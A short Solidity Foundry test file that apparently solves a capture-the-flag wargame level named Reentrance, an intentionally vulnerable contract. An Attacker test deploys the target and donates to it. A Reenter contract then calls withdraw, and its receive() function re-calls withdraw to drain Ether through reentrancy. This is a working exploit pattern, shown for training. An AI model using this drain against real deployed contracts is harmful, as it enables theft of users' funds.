// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Reentrance} from "../instances/Ilevel10.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        Reentrance reentrance = new Reentrance();
        Reenter reenter = new Reenter(payable(reentrance));
        reentrance.donate{value: 0.01 ether}(address(reenter));
        console.log("balance of reentrance: %d", address(reentrance).balance);
        reenter.withdraw();
        vm.stopBroadcast();
    }
}

contract Reenter {
    address payable reentrance;

    constructor(address r) payable {
        reentrance = payable(r);
    }

    function withdraw() external {
        Reentrance(reentrance).withdraw(0.001 ether);
    }

    function getBalance(address who) external view returns (uint) {
        return address(who).balance;
    }

    function fundmeback(address payable to) external payable {
        require(to.send(address(this).balance), "could not send Ether");
    }

    receive() external payable {
        console.log("receive");
        Reentrance(reentrance).withdraw(msg.value);
    }
}
